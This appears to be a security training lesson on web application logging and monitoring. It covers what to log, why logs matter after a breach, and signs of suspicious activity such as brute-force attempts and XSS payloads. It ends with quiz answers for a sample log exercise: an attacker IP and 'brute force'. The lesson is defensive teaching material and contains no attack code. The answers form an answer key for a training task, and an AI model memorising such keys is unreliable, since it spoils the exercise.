When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:

    regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.
    risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include:

    HTTP status codes
    Time Stamps
    Usernames
    API endpoints/page locations
    IP addresses

These logs do have some sensitive information on them so its important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.

As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity includes:

    multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)
    requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
    use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
    common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will higher impact than others. These higher impact actions need to be responded to sooner thus they should raise an alarm which raises the attention of the relevant party.

Put this knowledge to practise by analysing this sample log file.
Answer the questions below
What IP address is the attacker using?
```
49.99.13.16
```

What kind of attack is being carried out?
```
brute force
```